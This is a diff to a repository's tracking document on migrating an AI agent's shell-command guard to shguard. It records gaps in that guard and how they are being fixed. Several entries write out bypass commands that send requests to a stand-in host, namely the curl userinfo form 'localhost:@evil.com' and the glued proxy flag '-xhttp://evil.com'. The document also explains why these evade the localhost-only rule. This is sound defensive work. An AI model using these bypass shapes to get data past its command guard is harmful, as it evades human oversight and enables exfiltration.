@@ -41,8 +41,9 @@ weakening, documented so it isn't mistaken for a bug later.
 | 20 | Parser can't parse `2>&1`/for/while/until/function-defs/`$?`/subshells — falls back to blanket `ask`, rule engine never runs | **resolved** | [shguard#75](https://github.com/tsukasaI/shguard/issues/75) fixed |
 | 21 | `git grep` bare-command match doesn't cover git subcommand form | gap, partial config fix | fixed via `dotfiles-tool-policy-git-grep`; `git -C <dir> grep` still uncovered |
 | 22 | `git commit -m "$(...)"` (heredoc-style commit messages) now `ask`s instead of `allow`s | **resolved** — no longer the cutover blocker (superseded by #23/#24) | [shguard#146](https://github.com/tsukasaI/shguard/issues/146) fixed |
-| 23 | curl userinfo-URL bypass (`localhost:` as userinfo, not port) + rsync bare-relative-path over-block | **regression (security) — blocks full cutover** (userinfo bypass); friction only (rsync sub-gap), not fixable from `config.toml` | [shguard#147](https://github.com/tsukasaI/shguard/issues/147) open (userinfo bypass only; rsync sub-gap not filed) |
-| 24 | `if`/background job (`&`)/`[[ ]]`/`!` hit the same parse-failure-bypasses-rule-engine path as #20 — #75's fix didn't cover them | **regression — blocks full cutover** | [shguard#191](https://github.com/tsukasaI/shguard/issues/191) filed |
+| 23 | curl userinfo-URL bypass (`localhost:` as userinfo, not port) + rsync bare-relative-path over-block | **userinfo bypass resolved** (`url_host` matcher replaces `exact`/`prefix` in `except_targets`, fable-reviewed 2026-08-24 — pending manual apply, `config.toml` is Claude-edit-blocked); rsync sub-gap still friction only, not fixable from `config.toml` | [shguard#147](https://github.com/tsukasaI/shguard/issues/147) open upstream (P2, real fix path via `url_host` now exists — this repo just needs to apply it); rsync sub-gap not filed |
+| 24 | `if`/background job (`&`)/`[[ ]]`/`!` hit the same parse-failure-bypasses-rule-engine path as #20 — #75's fix didn't cover them | **resolved** — confirmed both by the closed ticket and live: zero "unsupported construct" parse failures in the shadow log (`~/.local/share/shguard-shadow/shadow.jsonl`) since the 2026-08-23 `darwin-rebuild switch` onto shguard 0.6.0, vs. 5+ occurrences of "if clause" alone before that switch | [shguard#191](https://github.com/tsukasaI/shguard/issues/191) closed 2026-08-15 |
+| 25 | curl glued proxy flag (`-xhttp://evil.com`) bypasses the localhost-only rule entirely | **regression (security) — blocks full cutover** | [dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49) filed |
 
 ## 1. Malformed-input fail-closed mode
 
@@ -83,12 +84,16 @@ subdomain-spoof (`localhost.evil.com`) denies, local-to-local rsync
 allows, and remote rsync denies.
 
 **Not exact parity, though** — a fable review (2026-08-06) found two
-residual sub-gaps neither fixable from `config.toml` nor from a tighter
-`except_targets` list; see #23 below for both: a userinfo-URL bypass
-(`curl http://localhost:@evil.com` allows when it should deny — a real
-exfiltration vector, not just friction) and an rsync over-block on bare
-relative paths (`rsync -a src/ dst/` now denies where the old hook
-allowed it). Both are locked in as `KNOWN_DELTA` cases in
+residual sub-gaps: a userinfo-URL bypass (`curl http://localhost:@evil.com`
+allowed when it should deny — a real exfiltration vector, not just
+friction), **resolved 2026-08-24 via the `url_host` matcher, see #23
+below**, and an rsync over-block on bare relative paths
+(`rsync -a src/ dst/` now denies where the old hook allowed it), still
+open — neither fixable from a tighter `except_targets` string-match list.
+A follow-up fable review (2026-08-24) also found a third, previously
+undocumented gap in this same rule area: a glued curl proxy flag
+(`-xhttp://evil.com`) bypasses the rule entirely — see #25 below. All are
+locked in as `KNOWN_DELTA` (or, once resolved, plain) cases in
 `tests/shguard-parity-check.sh` rather than left silently uncovered.
 
 ## 3. Pipe-to-interpreter beyond curl\|wget→sh
@@ -575,39 +580,77 @@ longer a cutover blocker on its own — see #24 below for the finding
 that replaces it as the active blocker, and #23 above for the other
 live blocker (curl userinfo bypass).
 
-## 23. curl userinfo-URL bypass + rsync bare-relative-path over-block — userinfo bypass blocks full cutover
+## 23. curl userinfo-URL bypass (resolved) + rsync bare-relative-path over-block (still open)
 
 Found by a fable code-review pass (2026-08-06) on the #2/#19 curl/rsync
 rules above, before they were committed — verified live, not just read.
-Two distinct sub-gaps in the same rules, neither fixable from
-`config.toml`:
+Two distinct sub-gaps in the same rules:
 
-**Userinfo-URL bypass (security-relevant, not just friction).** The
-`except_targets` anchoring (`{ exact = "http://localhost" }`,
+**Userinfo-URL bypass (security-relevant, not just friction) — resolved
+2026-08-24.** The `except_targets` anchoring (`{ exact = "http://localhost" }`,
 `{ prefix = "http://localhost:" }`, `{ prefix = "http://localhost/" }`,
-same for 127.0.0.1/`[::1]`/https) is plain string prefix matching with
+same for 127.0.0.1/`[::1]`/https) was plain string prefix matching with
 no URL-authority parsing. curl treats `user:password@host` as
-userinfo, not a port, so a colon right after `localhost` is
+userinfo, not a port, so a colon right after `localhost` was
 indistinguishable from a real `:port` to a prefix match:
 
 ```
-curl http://localhost:@evil.com     old=deny  shguard=allow
-curl http://localhost:80@evil.com   old=deny  shguard=allow
+curl http://localhost:@evil.com     old=deny  shguard=allow (pre-fix)
+curl http://localhost:80@evil.com   old=deny  shguard=allow (pre-fix)
 ```
 
 Both connect to **evil.com**, not localhost — a real exfiltration
-vector `block-dangerous.sh`'s `LOCAL_URL_RE` regex closes (it requires
-`:[0-9]+` followed by a real boundary) but this port cannot express
-with prefix/exact target matching alone. Widening the anchors would
-either still miss this shape or start rejecting ordinary
-`localhost:3000` usage — not a config fix, a schema limitation (same
-class as delta #9's "no suffix/contains matcher" gap). Locked in as
-`KNOWN_DELTA` cases in `tests/shguard-parity-check.sh`
-(`curl http://localhost:@evil.com`, `curl http://localhost:80@evil.com`)
-so the hole stays visible rather than silently passing parity.
-**Together with #24, this is why full cutover remains paused** — this
-one specifically because it would flip a currently-`deny`d exfiltration
-vector to a silent `allow`, not just a dismissible `ask`.
+vector `block-dangerous.sh`'s `LOCAL_URL_RE` regex closed but plain
+prefix/exact target matching couldn't. **Fixed by switching
+`dotfiles-network-curl-remote`'s `except_targets` from `exact`/`prefix`
+string matching to the `url_host` matcher** (shguard#102, PR#207 merged
+2026-08-15, ahead of this repo's 2026-08-20 flake pin) — `url_host`
+parses the candidate as a real URL and compares its actual host
+component, closing the userinfo-spoofing shape entirely rather than
+narrowing it. Fable-reviewed 2026-08-24 (independent verification
+against a scratch config with an identical rule shape): the bypass
+repro cases now deny, ordinary localhost usage
+(`http://localhost:3000/api`, `-o out.json http://127.0.0.1:8080/`,
+IPv6, case-insensitive host, `127.1`/`0x7f.0.0.1` numeric forms, etc.)
+still allows, and no new bypass was found for this specific rule. Per
+the README's explicit warning, the old `exact`/`prefix` entries were
+**removed**, not layered alongside `url_host` — `except_targets`
+alternatives are OR'd, so keeping even one prefix entry would have
+silently reopened the exact bypass this fix exists to close.
+
+`config.toml` is one of this repo's own guardrail files
+(`block-config-edit.sh` blocks Claude from editing it directly), so the
+fix is written here as the exact diff to apply manually rather than
+applied by Claude:
+
+```diff
+ except_targets = [
+-  { exact = "http://localhost" }, { prefix = "http://localhost:" }, { prefix = "http://localhost/" },
+-  { exact = "https://localhost" }, { prefix = "https://localhost:" }, { prefix = "https://localhost/" },
+-  { exact = "http://127.0.0.1" }, { prefix = "http://127.0.0.1:" }, { prefix = "http://127.0.0.1/" },
+-  { exact = "https://127.0.0.1" }, { prefix = "https://127.0.0.1:" }, { prefix = "https://127.0.0.1/" },
+-  { exact = "http://[::1]" }, { prefix = "http://[::1]:" }, { prefix = "http://[::1]/" },
+-  { exact = "https://[::1]" }, { prefix = "https://[::1]:" }, { prefix = "https://[::1]/" },
++  # url_host only — never add exact/prefix entries alongside: except_targets
++  # are OR'd, and a retained prefix entry reopens the userinfo bypass this
++  # fix closes (see #23 in this doc). Scheme-blind by design (excepts
++  # http/https/ws/wss/ftp alike).
++  { url_host = "localhost" },
++  { url_host = "127.0.0.1" },
++  { url_host = "[::1]" },
+ ]
+```
+
+Once applied, `tests/shguard-parity-check.sh`'s two userinfo-bypass
+cases (`curl http://localhost:@evil.com`,
+`curl http://localhost:80@evil.com`) move from `KNOWN_DELTA` to plain
+passing cases — deliberately, so a future regression (e.g. someone
+re-adding a prefix entry) fails the parity check instead of printing as
+an expected delta.
+
+**Together with #25 (found in the same fable pass), this is now why
+full cutover remains paused for the curl/rsync area** — not the
+userinfo bypass any more, which is closed.
 
 **`-K`/`--config` deliberately excluded from `value_flags`, unlike the
 other 13 flags.** `curl -K file.cfg` reads additional directives —
@@ -640,9 +683,11 @@ as a `KNOWN_DELTA` case (`rsync -a src/ dst/`) in
 `tests/shguard-parity-check.sh`.
 
 Userinfo bypass filed as
-[shguard#147](https://github.com/tsukasaI/shguard/issues/147). The
-rsync bare-relative-path sub-gap is not filed — pure friction, low
-severity, revisit if/when this migration resumes.
+[shguard#147](https://github.com/tsukasaI/shguard/issues/147) — ticket
+still open upstream (relabeled P2, since a real fix path now exists via
+`url_host`), tracked here as resolved once this repo applies the diff
+above. The rsync bare-relative-path sub-gap is not filed — pure
+friction, low severity, revisit if/when this migration resumes.
 
 ## 24. `if`/background job (`&`)/`[[ ]]`/`!` hit the same parse-failure path as #20 — #75 didn't cover them, blocks full cutover
 
@@ -676,8 +721,83 @@ inside a quoted example.)
 Same conclusion as #20: not filed as fixable from `config.toml` — this
 is a parser-translation gap in shguard itself, not a rule-schema
 expressiveness limit. Filed as
-[shguard#191](https://github.com/tsukasaI/shguard/issues/191).
-**This, together with #23's userinfo bypass, is why full cutover
-remains paused** even though #22 (the previously-documented blocker)
-is now resolved — resolving #22 replaced the blocker, it didn't clear
-it.
+[shguard#191](https://github.com/tsukasaI/shguard/issues/191), closed
+2026-08-15.
+
+**Resolved, confirmed live 2026-08-24.** Mined the shadow log
+(`~/.local/share/shguard-shadow/shadow.jsonl`) for
+`"unsupported construct"` reasons after the 2026-08-23 `darwin-rebuild
+switch` onto shguard 0.6.0 (the pin that carries #191's fix): zero
+occurrences of `if clause`, `background job (&)`, `extended test
+command ([[ ]])`, or `pipeline negation (!)` since that switch, against
+5+ occurrences of `if clause` alone in the window immediately before it
+(2026-08-15 through 2026-08-18, i.e. before this machine had actually
+rebuilt onto the fixed binary — the ticket closing on 2026-08-15 and
+this machine picking up the fix are two different events). This closes
+#24 as a live cutover blocker, not just a closed ticket.
+
+Residual, out of scope for this entry: the same post-2026-08-23 window
+of the shadow log surfaces several *new* "unsupported construct"
+categories not covered by #20 or #24 — several parameter-expansion
+forms (`${var@Q}`-style substitution, `${#var}`, `${arr[@]}`,
+`${PIPESTATUS[0]}`, suffix-pattern removal), here-strings (`<<<`), a
+`case` clause, and one "compound-command keyword nesting exceeds the
+raw count cap" — none yet triaged for whether the old hook would have
+denied the underlying command (the same distinction that made #20/#24
+real blockers rather than pure friction). Not filed upstream and not
+added to this doc as a numbered entry yet; flagging here so it isn't
+lost, and revisit before treating full cutover as fully clear.
+
+## 25. curl glued proxy flag (`-xhttp://evil.com`) bypasses the localhost-only rule
+
+Found by the same fable review (2026-08-24) that verified #23's
+`url_host` fix, while checking for other bypass shapes against the same
+`dotfiles-network-curl-remote` rule. Not a variant of #23 — a distinct
+gap, previously undocumented.
+
+curl's short proxy flag accepts its value glued directly to the flag
+with no separator: `-xhttp://evil.example.com` is equivalent to
+`-x http://evil.example.com` / `--proxy http://evil.example.com`.
+`block-dangerous.sh` denied this (confirmed by source read of
+`block-dangerous.sh:250-259`: after its own localhost-prefix stripping,
+the leftover `http://` from the glued value still trips the block).
+Both the pre-#23-fix and post-#23-fix `config.toml` **allow** it
+(confirmed live): `except_targets`/`value_flags` only inspect tokens
+shguard's own candidate-target detection recognizes, and a value glued
+onto a single-dash flag with no `=` is indistinguishable by shape alone
+from an ordinary combined short-flag cluster (e.g. `-sSL`) — shguard
+never treats it as a candidate target at all, so a request to a fully
+local, `except_targets`-exempted URL gets silently proxied through an
+attacker-controlled host, exfiltrating headers/body to it.
+
+```
+curl -xhttp://evil.com http://localhost:3000/api   old: deny   shguard: allow
+```
+
+Fixable from `config.toml`: shguard has an `attached_value_flags` field
+(distinct from `value_flags`) precisely for this glued-short-flag shape
+— declaring `attached_value_flags = ["x"]` on the curl rule makes the
+glued value a real candidate target, so it gets checked against
+`except_targets` like any other. **Not applied in the same change as
+#23** — this repo currently has no curl `-x`/`--proxy` rule at all to
+attach it to (the separate-token forms `-x http://evil.com` and
+`--proxy=http://evil.com` are unaffected by this gap and already deny
+today, confirmed live), and per shguard's README, declaring a flag in
+`attached_value_flags` also changes what counts as *the* candidate
+target for the whole rule (it can newly suppress a match, not just
+widen detection) — worth its own reviewed change rather than folding
+into #23's diff. Do **not** "fix" this by adding `x` to `value_flags`
+instead of `attached_value_flags` — that would flip the currently-safe
+separate-token forms (`-x http://evil.com`, `--proxy=http://evil.com`)
+to allow, since `value_flags` means "this flag's value is never a
+target," the opposite of what's needed here.
+
+Locked in as a `KNOWN_DELTA` case
+(`curl -xhttp://evil.com http://localhost:3000/api`) in
+`tests/shguard-parity-check.sh` so the hole stays visible. **This,
+together with the rsync bare-relative-path sub-gap in #23, is why full
+cutover remains paused** for the curl/rsync rule area even after #23's
+userinfo bypass closes. Filed as
+[dotfiles#49](https://github.com/tsukasaI/dotfiles/issues/49) (not a
+shguard upstream issue — this is a config-side gap, and the primitive
+to close it, `attached_value_flags`, already exists).
